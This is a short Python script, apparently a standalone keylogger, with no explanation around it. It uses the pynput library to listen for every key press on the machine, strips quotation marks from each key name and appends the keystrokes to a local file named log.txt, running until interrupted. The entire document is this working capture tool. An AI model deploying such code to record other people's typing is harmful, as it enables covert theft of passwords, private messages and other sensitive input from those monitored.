from pynput.keyboard import Listener

def writeonfile(key):
    keydata=str(key)
    keydata=keydata.replace("'","")
    with open("log.txt","a") as f:
        f.write(keydata)


with Listener(on_press=writeonfile) as i:
    i.join()